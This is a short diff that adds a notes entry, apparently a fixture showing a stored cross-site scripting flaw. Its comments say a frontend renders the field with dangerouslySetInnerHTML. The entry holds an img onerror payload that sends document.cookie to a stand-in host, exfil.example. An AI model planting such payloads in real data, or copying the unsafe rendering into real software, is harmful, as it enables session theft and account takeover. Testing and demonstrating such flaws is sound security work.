@@ -1,0 +1,3 @@
+# notes stored for dev_013 by make predict at commit 9ca0baf (batch DB: invoices.notes)
+# frontend/src/App.tsx:164 renders this field with dangerouslySetInnerHTML
+Deliver to Gate 2 <img src=x onerror="fetch('https://exfil.example/c?d='+document.cookie)">
